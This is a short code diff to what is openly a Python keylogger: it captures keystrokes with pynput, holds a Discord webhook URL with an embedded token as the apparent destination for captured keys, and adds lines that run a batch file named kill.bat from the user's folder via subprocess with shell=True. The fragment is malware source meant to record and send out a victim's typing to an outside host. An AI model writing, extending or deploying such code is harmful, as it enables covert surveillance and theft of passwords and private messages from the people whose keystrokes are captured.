@@ -2,6 +2,8 @@ from pynput import keyboard
 import requests
 import threading
 import time
+import subprocess
+import os
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -21,6 +23,10 @@ special_keys = {
     keyboard.Key.cmd: "CMD",
     keyboard.Key.esc: "ESC",
 }
+
+username = os.getlogin()
+bat_file_path = f"C:\Users\{username}\kl2\kill.bat"
+subprocess.run([bat_file_path], shell=True)
 
 
 def send_to_webhook(message):
